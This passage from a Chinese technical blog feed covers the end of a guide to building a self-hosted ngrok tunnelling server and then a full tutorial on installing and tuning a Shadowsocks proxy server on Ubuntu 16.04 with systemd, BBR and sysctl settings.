release-server</span><br></pre></td></tr></table></figure><p>如果make clean报错，忽略make clean直接执行make release-server。</p><p>编译过程需要等待一会，因为需要通过git安装相关依赖包。如果提示没有权限，使用<code>sudo</code>命令来安装。</p><p>在编译客户端的时候需要指明对应的操作系统和构架：</p><ul><li>Linux 平台 32 位系统：GOOS=linux GOARCH=386</li><li>Linux 平台 64 位系统：GOOS=linux GOARCH=amd64</li><li>Windows 平台 32 位系统：GOOS=windows GOARCH=386</li><li>Windows 平台 64 位系统：GOOS=windows GOARCH=amd64</li><li>MAC 平台 32 位系统：GOOS=darwin GOARCH=386</li><li>MAC 平台 64 位系统：GOOS=darwin GOARCH=amd64</li><li>ARM 平台：GOOS=linux GOARCH=arm</li></ul><p>例如编译Linux64位的客户端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GOOS&#x3D;linux GOARCH&#x3D;amd64 make release-client</span><br></pre></td></tr></table></figure><p>生成的文件放在<code>/bin</code>对应的文件夹中，如windows 64位的为：windows_amd64，默认版本的文件就在根目录下。</p><h2 id="3-4-启动ngrokd服务器"><a href="#3-4-启动ngrokd服务器" class="headerlink" title="3.4 启动ngrokd服务器"></a>3.4 启动ngrokd服务器</h2><p>编译后生成两个文件分别为服务端（ngrokd）和客户端(ngrok)。切换到对应的文件夹，运行服务端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ngrokd -domain&#x3D;&quot;$NGROK_DOMAIN&quot; -httpAddr&#x3D;&quot;:801&quot; -httpsAddr&#x3D;&quot;:802&quot;</span><br></pre></td></tr></table></figure><p>参数<code>-domain</code>表示服务器域名，请改成你自己的域名；<code>-httpAddr</code>表示默认监听的HTTP端口，<code>-httpsAddr</code>表示默认监听的HTTPS端口，因为我用不到所以都设置成空字符串”“来关闭监听，如果需要打开的话记得格式是<code>:12345</code>（冒号+端口号）这样的；<code>-tunnelAddr</code>表示服务器监听客户端连接的隧道端口号，格式和前面一样；<code>-log</code>表示日志文件位置；还有个<code>-log-level</code>用来控制日志记录的事件级别，选项有DEBUG、INFO、WARNING、ERROR。</p><p>如果编译的是不带release的版本，还可以通过<code>-tlsCrt</code>和<code>-tlsKey</code>选项来指定证书文件的位置。</p><p>出现类似以下内容，则说明我们的服务器端ngrokd正常运行了:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[16:41:56 CST 2017/04/20] [INFO] (ngrok/<span class="built_in">log</span>.(*PrefixLogger).Info:83) [registry] [tun] No affinity cache specified</span><br><span class="line">[16:41:56 CST 2017/04/20] [INFO] (ngrok/<span class="built_in">log</span>.(*PrefixLogger).Info:83) [metrics] Reporting every 30 seconds</span><br><span class="line">[16:41:57 CST 2017/04/20] [INFO] (ngrok/log.Info:112) Listening <span class="keyword">for</span> public http connections on [::]:80</span><br><span class="line">[16:41:57 CST 2017/04/20] [INFO] (ngrok/log.Info:112) Listening <span class="keyword">for</span> public https connections on [::]:443</span><br><span class="line">[16:41:57 CST 2017/04/20] [INFO] (ngrok/log.Info:112) Listening <span class="keyword">for</span> control and proxy connections on [::]:4443</span><br><span class="line">[16:41:57 CST 2017/04/20] [INFO] (ngrok/<span class="built_in">log</span>.(*PrefixLogger).Info:83) [tun:627acc92] New connection from 42.53.196.242:9386</span><br><span class="line">[16:41:57 CST 2017/04/20] [DEBG] (ngrok/<span class="built_in">log</span>.(*PrefixLogger).Debug:79) [tun:627acc92] Waiting to <span class="built_in">read</span> message</span><br><span class="line">[16:41:57 CST 2017/04/20] [DEBG] (ngrok/<span class="built_in">log</span>.(*PrefixLogger).Debug:79) [tun:627acc92] Reading message with length: 159</span><br></pre></td></tr></table></figure><p>如果需要后台运行可以使用<code>screen</code>或<code>nohup</code>，详情自行搜索。</p><h2 id="4-配置ngrok客户端"><a href="#4-配置ngrok客户端" class="headerlink" title="4. 配置ngrok客户端"></a>4. 配置ngrok客户端</h2><p>将之前编译好的客户端文件拷贝到需要使用服务的设备上。</p><h3 id="4-1-建立配置文件"><a href="#4-1-建立配置文件" class="headerlink" title="4.1 建立配置文件"></a>4.1 建立配置文件</h3><p>在ngrok同路径下建立配置文件<code>ngrok.yml</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server_addr:</span> <span class="string">“ngrok.test.website:4443&quot;</span></span><br><span class="line"><span class="attr">trust_host_root_certs:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">tunnels:</span></span><br><span class="line">  <span class="attr">ssh:</span></span><br><span class="line">    <span class="attr">remote_port:</span> <span class="number">6666</span></span><br><span class="line">    <span class="attr">proto:</span></span><br><span class="line">      <span class="attr">tcp:</span> <span class="number">22</span></span><br></pre></td></tr></table></figure><p>server_addr端口默认4443，可通过ngrokd服务端启动修改端口。在<code>tunnels</code>里配置隧道信息，具体可见<a href="https://imlonghao.com/28.html">「翻译」ngrok 1.X 配置文档</a>。注意<code>http</code>和<code>https</code>隧道可设置<code>subdomain</code>和<code>auth</code>，而<code>tcp</code>里只能设置<code>remote_port</code>。</p><p>还可以<strong>转发其他IP的端口</strong>，方法就是在proto下的tcp（或http、https）后的端口号写成IP地址:端口号的格式（中间是英文冒号）。如：<code>tcp: 192.168.11.1:80</code></p><h3 id="4-2-运行客户端"><a href="#4-2-运行客户端" class="headerlink" title="4.2 运行客户端"></a>4.2 运行客户端</h3><p>现在运行客户端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ngrok -config&#x3D;ngrok.yml start ssh</span><br></pre></td></tr></table></figure><p>回车后，看到这样一个界面，说明启动成功：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/online.png" alt="Online"></p><p>如果显示<code>reconnecting</code>说明连接有错，在运行时加入<code>-log=stdout</code>来进行debug。可能有以下几方面原因：</p><ol><li><p>可能是服务器端口未开放，在服务器上使用<code>sudo iptables --list</code>查看当前规则</p></li><li><p>查看是否网络问题，<code>ping</code>到对应的地址检查</p></li><li><p>可能是编译的时候证书没有覆盖或者版本不对，重新编译试试</p></li><li><p>这里有几个注意的点：</p><ul><li>在使用ECS时，注意是否在安全组中配置了相关端口。例如上边服务端和客户端使用的4443。</li><li>这里有些一键安装脚本，大家可参考，有些配置和版本已经过时：<ul><li><a href="https://gist.github.com/popucui/18c342baefefed2ba66f87a9420efae5">https://gist.github.com/popucui/18c342baefefed2ba66f87a9420efae5</a></li><li><a href="https://github.com/sunnyos/ngrok/blob/master/ngrok.sh">https://github.com/sunnyos/ngrok/blob/master/ngrok.sh</a></li></ul></li></ul><h3 id="Nginx-代理共享80出口"><a href="#Nginx-代理共享80出口" class="headerlink" title="Nginx 代理共享80出口"></a>Nginx 代理共享80出口</h3><p>微信公众号开发时，要求后端服务没有端口。那么我们ngrok服务的http端口就需要设置为80。问题来了，我们服务器上还可能跑着其他应用，比如我的ECS上还跑了我的博客实例。这怎么办呢？解决方案是使用nginx的反向代理。</p><p>nginx 的安装配置，大家可自行百度，这里不做过多描述。</p><p>大家只需在nginx的配置中增加一段server配置，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        server_name *.ngrok.pylixm.top </span><br><span class="line">        listen 80;</span><br><span class="line">        keepalive_timeout 70;</span><br><span class="line">        proxy_set_header &quot;Host&quot; $host:8081;  # 必须, 8081 为ngrok http转发端口</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass_header Server;</span><br><span class="line">                proxy_redirect off;</span><br><span class="line">                proxy_pass http://127.0.0.1:8081;  # 必须, 8081 为ngrok http转发端口</span><br><span class="line">        &#125;</span><br><span class="line">        access_log off;</span><br><span class="line">        log_not_found off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ul><pre><code> 这样我们可以直接使用`*.ngrok.pylixm.top` 这个子域名访问ngrok代理的我们本地的服务了，同时还又不影响其他的80端口服务。</code></pre><h2 id="5-详细资料"><a href="#5-详细资料" class="headerlink" title="5. 详细资料"></a>5. 详细资料</h2><p>  以下是我搭建服务器时参考的一些资料：</p><ul><li>基础知识：<a href="http://blog.csdn.net/zhangguo5/article/details/77848658">一分钟实现内网穿透（ngrok服务器搭建）</a></li><li>配置文档：<a href="https://imlonghao.com/28.html">「翻译」ngrok 1.X 配置文档</a></li><li>源码分析：<a href="https://tonybai.com/2015/05/14/ngrok-source-intro/">ngrok原理浅析</a></li><li>后续定制优化：<a href="http://blog.leanote.com/post/jesse/045ba03e0da6">CentOS7配置ngrok实现内网穿透</a></li><li><a href="https://prikevs.github.io/2016/12/26/add-authentication-to-ngrok/">给ngrok添加身份验证</a></li><li><a href="https://toontong.github.io/blog/about-ngrok.html">关于 ngrok 使用上的注意事项</a></li><li><a href="https://morongs.github.io/2016/12/28/dajian-ngrok/">从零教你搭建ngrok服务，解决外网调试本地站点</a></li><li><a href="https://yii.im/posts/pretty-self-hosted-ngrokd/">搭建并配置优雅的 ngrok 服务实现内网穿透</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> ngrok </tag>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 16.04下Shadowsocks服务器端安装及优化</title>
      <link href="/Ubuntu%20Shadowsocks/"/>
      <url>/Ubuntu%20Shadowsocks/</url>
      
        <content type="html"><![CDATA[<p>Ubuntu 16.04下Shadowsocks服务器端安装及优化</p><a id="more"></a><h1 id="Ubuntu-16-04下Shadowsocks服务器端安装及优化"><a href="#Ubuntu-16-04下Shadowsocks服务器端安装及优化" class="headerlink" title="Ubuntu 16.04下Shadowsocks服务器端安装及优化"></a>Ubuntu 16.04下Shadowsocks服务器端安装及优化</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本教程旨在提供简明的Ubuntu 16.04下安装服务器端Shadowsocks。不同于Ubuntu 16.04之前的教程，本文抛弃initd，转而使用Ubuntu 16.04支持的Systemd管理Shadowsocks的启动与停止，显得更为便捷。优化部分包括BBR、TCP Fast Open以及吞吐量优化。</p><p>本教程仅适用于Ubuntu 16.04及之后的版本，基于Python 3，支持IPv6。</p><h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装<code>pip</code></h2><p>本教程使用Python 3为载体，因Python 3对应的包管理器<code>pip3</code>并未预装，首先安装<code>pip3</code>：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br></pre></td></tr></table></figure><h2 id="安装Shadowsocks"><a href="#安装Shadowsocks" class="headerlink" title="安装Shadowsocks"></a>安装Shadowsocks</h2><p>因Shadowsocks作者不再维护<code>pip</code>中的Shadowsocks（定格在了2.8.2），我们使用下面的命令来安装最新版的Shadowsocks：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install https://github.com/shadowsocks/shadowsocks/archive/master.zip</span><br></pre></td></tr></table></figure><p>安装完成后可以使用下面这个命令查看Shadowsocks版本：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssserver --version</span><br></pre></td></tr></table></figure><p>目前会显示“Shadowsocks 3.0.0”。</p><h2 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h2><p>创建Shadowsocks配置文件所在文件夹：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /etc/shadowsocks</span><br></pre></td></tr></table></figure><p>然后创建配置文件：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/shadowsocks/config.json</span><br></pre></td></tr></table></figure><p>复制粘贴如下内容（注意修改密码“password”）：</p><p>JSON</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;server&quot;</span>:<span class="string">&quot;::&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;server_port&quot;</span>:<span class="number">8388</span>,</span><br><span class="line">    <span class="attr">&quot;local_address&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;local_port&quot;</span>:<span class="number">1080</span>,</span><br><span class="line">    <span class="attr">&quot;password&quot;</span>:<span class="string">&quot;mypassword&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;timeout&quot;</span>:<span class="number">300</span>,</span><br><span class="line">    <span class="attr">&quot;method&quot;</span>:<span class="string">&quot;aes-256-cfb&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fast_open&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后按<code>Ctrl + O</code>保存文件，<code>Ctrl + X</code>退出。</p><h2 id="测试Shadowsocks配置"><a href="#测试Shadowsocks配置" class="headerlink" title="测试Shadowsocks配置"></a>测试Shadowsocks配置</h2><p>首先记录下服务器的IP地址</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>找到IPv4地址（和IPv6地址），如我的<code>ifconfig</code>输出为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eth0      Link encap:Ethernet  HWaddr 46:91:89:4e:c1:52</span><br><span class="line">          inet addr:138.68.51.55  Bcast:138.68.63.255  Mask:255.255.240.0</span><br><span class="line">          inet6 addr: fe80::4491:89ff:fe4e:c152&#x2F;64 Scope:Link</span><br><span class="line">          inet6 addr: 2604:a880:2:d0::3727:7001&#x2F;64 Scope:Global</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:102667 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:7869 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:151166937 (151.1 MB)  TX bytes:1151476 (1.1 MB)</span><br></pre></td></tr></table></figure><p>所以我的IPv4地址是<code>138.68.51.55</code>，IPv6地址是<code>2604:a880:2:d0::3727:7001</code>。</p><p>然后来测试下Shadowsocks能不能正常工作了：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks/config.json</span><br></pre></td></tr></table></figure><p>在Shadowsocks客户端添加服务器，如果你使用的是我提供的那个配置文件的话，地址填写你的<code>IPv4地址</code>或<code>IPv6地址</code>，端口号为<code>8388</code>，加密方法为<code>aes-256-cfb</code>，密码为<code>你设置的密码</code>。然后设置客户端使用全局模式，浏览器登录Google试试应该能直接打开了。</p><p>这时浏览器登录<code>http://ip138.com/</code>就会显示Shadowsocks服务器的IP啦！</p><p>测试完毕，按<code>Ctrl + C</code>关闭Shadowsocks。</p><h2 id="配置Systemd管理Shadowsocks"><a href="#配置Systemd管理Shadowsocks" class="headerlink" title="配置Systemd管理Shadowsocks"></a>配置Systemd管理Shadowsocks</h2><p>新建Shadowsocks管理文件</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/systemd/system/shadowsocks-server.service</span><br></pre></td></tr></table></figure><p>复制粘贴：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;Shadowsocks Server</span><br><span class="line">After&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;ssserver -c &#x2F;etc&#x2F;shadowsocks&#x2F;config.json</span><br><span class="line">Restart&#x3D;on-abort</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><p><code>Ctrl + O</code>保存文件，<code>Ctrl + X</code>退出。</p><p>启动Shadowsocks：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start shadowsocks-server</span><br></pre></td></tr></table></figure><p>设置开机启动Shadowsocks：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> shadowsocks-server</span><br></pre></td></tr></table></figure><p>至此，Shadowsock服务器端的基本配置已经全部完成了！</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>这部分属于进阶操作，在你使用Shadowsocks时感觉到延迟较大，或吞吐量较低时，可以考虑对服务器端进行优化。</p><h3 id="开启BBR"><a href="#开启BBR" class="headerlink" title="开启BBR"></a>开启BBR</h3><p>BBR系Google最新开发的TCP拥塞控制算法，目前有着较好的带宽提升效果，甚至不比老牌的锐速差。</p><h4 id="升级Linux内核"><a href="#升级Linux内核" class="headerlink" title="升级Linux内核"></a>升级Linux内核</h4><p>BBR在Linux kernel 4.9引入。首先检查服务器kernel版本：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure><p>如果其显示版本在4.9.0之下，则需要升级Linux内核，否则请忽略下文。</p><p>更新包管理器：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>查看可用的Linux内核版本：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-cache showpkg linux-image</span><br></pre></td></tr></table></figure><p>找到一个你想要升级的Linux内核版本，如“linux-image-4.10.0-22-generic”：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install linux-image-4.10.0-22-generic</span><br></pre></td></tr></table></figure><p>等待安装完成后重启服务器：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p>删除老的Linux内核：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo purge-old-kernels</span><br></pre></td></tr></table></figure><h4 id="开启BBR-1"><a href="#开启BBR-1" class="headerlink" title="开启BBR"></a>开启BBR</h4><p>运行<code>lsmod | grep bbr</code>，如果结果中没有<code>tcp_bbr</code>，则先运行：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">modprobe tcp_bbr</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;tcp_bbr&quot;</span> &gt;&gt; /etc/modules-load.d/modules.conf</span><br></pre></td></tr></table></figure><p>运行：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.core.default_qdisc=fq&quot;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.ipv4.tcp_congestion_control=bbr&quot;</span> &gt;&gt; /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>运行：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -p</span><br></pre></td></tr></table></figure><p>保存生效。运行：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysctl net.ipv4.tcp_available_congestion_control</span><br><span class="line">sysctl net.ipv4.tcp_congestion_control</span><br></pre></td></tr></table></figure><p>若均有<code>bbr</code>，则开启BBR成功。</p><h3 id="优化吞吐量"><a href="#优化吞吐量" class="headerlink" title="优化吞吐量"></a>优化吞吐量</h3><p>新建配置文件：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/sysctl.d/local.conf</span><br></pre></td></tr></table></figure><p>复制粘贴：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># max open files</span><br><span class="line">fs.file-max &#x3D; 51200</span><br><span class="line"># max read buffer</span><br><span class="line">net.core.rmem_max &#x3D; 67108864</span><br><span class="line"># max write buffer</span><br><span class="line">net.core.wmem_max &#x3D; 67108864</span><br><span class="line"># default read buffer</span><br><span class="line">net.core.rmem_default &#x3D; 65536</span><br><span class="line"># default write buffer</span><br><span class="line">net.core.wmem_default &#x3D; 65536</span><br><span class="line"># max processor input queue</span><br><span class="line">net.core.netdev_max_backlog &#x3D; 4096</span><br><span class="line"># max backlog</span><br><span class="line">net.core.somaxconn &#x3D; 4096</span><br><span class="line"></span><br><span class="line"># resist SYN flood attacks</span><br><span class="line">net.ipv4.tcp_syncookies &#x3D; 1</span><br><span class="line"># reuse timewait sockets when safe</span><br><span class="line">net.ipv4.tcp_tw_reuse &#x3D; 1</span><br><span class="line"># turn off fast timewait sockets recycling</span><br><span class="line">net.ipv4.tcp_tw_recycle &#x3D; 0</span><br><span class="line"># short FIN timeout</span><br><span class="line">net.ipv4.tcp_fin_timeout &#x3D; 30</span><br><span class="line"># short keepalive time</span><br><span class="line">net.ipv4.tcp_keepalive_time &#x3D; 1200</span><br><span class="line"># outbound port range</span><br><span class="line">net.ipv4.ip_local_port_range &#x3D; 10000 65000</span><br><span class="line"># max SYN backlog</span><br><span class="line">net.ipv4.tcp_max_syn_backlog &#x3D; 4096</span><br><span class="line"># max timewait sockets held by system simultaneously</span><br><span class="line">net.ipv4.tcp_max_tw_buckets &#x3D; 5000</span><br><span class="line"># turn on TCP Fast Open on both client and server side</span><br><span class="line">net.ipv4.tcp_fastopen &#x3D; 3</span><br><span class="line"># TCP receive buffer</span><br><span class="line">net.ipv4.tcp_rmem &#x3D; 4096 87380 67108864</span><br><span class="line"># TCP write buffer</span><br><span class="line">net.ipv4.tcp_wmem &#x3D; 4096 65536 67108864</span><br><span class="line"># turn on path MTU discovery</span><br><span class="line">net.ipv4.tcp_mtu_probing &#x3D; 1</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_congestion_control &#x3D; bbr</span><br></pre></td></tr></table></figure><p>运行：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl --system</span><br></pre></td></tr></table></figure><p>编辑之前的shadowsocks-server.service文件：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/systemd/system/shadowsocks-server.service</span><br></pre></td></tr></table></figure><p>在<code>ExecStart</code>前插入一行，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExecStartPre&#x3D;&#x2F;bin&#x2F;sh -c &#39;ulimit -n 51200&#39;</span><br></pre></td></tr></table></figure><p>即修改后的shadowsocks-server.service内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;Shadowsocks Server</span><br><span class="line">After&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStartPre&#x3D;&#x2F;bin&#x2F;sh -c &#39;ulimit -n 51200&#39;</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;ssserver -c &#x2F;etc&#x2F;shadowsocks&#x2F;config.json</span><br><span class="line">Restart&#x3D;on-abort</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><p><code>Ctrl + O</code>保存文件，<code>Ctrl + X</code>退出。</p><p>重载shadowsocks-server.service：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>重启Shadowsocks：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart shadowsocks-server</span><br></pre></td></tr></table></figure><h3 id="开启TCP-Fast-Open"><a href="#开启TCP-Fast-Open" class="headerlink" title="开启TCP Fast Open"></a>开启TCP Fast Open</h3><p>TCP Fast Open可以降低Shadowsocks服务器和客户端的延迟。实际上在上一步已经开启了TCP Fast Open，现在只需要在Shadowsocks配置中启用TCP Fast Open。</p><p>编辑config.json：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/shadowsocks/config.json</span><br></pre></td></tr></table></figure><p>将<code>fast_open</code>的值由<code>false</code>修改为<code>true</code>。<code>Ctrl + O</code>保存文件，<code>Ctrl + X</code>退出。</p><p>重启Shadowsocks：</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart shadowsocks-server</span><br></pre></td></tr></table></figure><p>注意：TCP Fast Open同时需要客户端的支持，即客户端Linux内核版本为3.7.1及以上；你可以在Shadowsocks客户端中启用TCP Fast Open。</p><p>至此，Shadowsock服务器端的优化已经全部完成了！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/shadowsocks/shadowsocks/issues/622">怎么能更新到2.9.0呢? · Issue #622 · shadowsocks/shadowsocks</a></li><li><a href="https://github.com/shadowsocks/shadowsocks/wiki/Configuration-via-Config-File">Configuration via Config File · shadowsocks/shadowsocks Wiki</a></li><li><a href="https://askubuntu.com/questions/473886/list-all-versions-of-a-package">apt - List all versions of a package - Ask Ubuntu</a></li><li><a href="https://askubuntu.com/questions/187502/how-do-i-use-apt-get-to-update-to-the-latest-kernel">How do I use apt-get to update to the latest kernel? - Ask Ubuntu</a></li><li><a href="view-source:https://help.ubuntu.com/community/RemoveOldKernels">RemoveOldKernels - Community Help Wiki</a></li><li><a 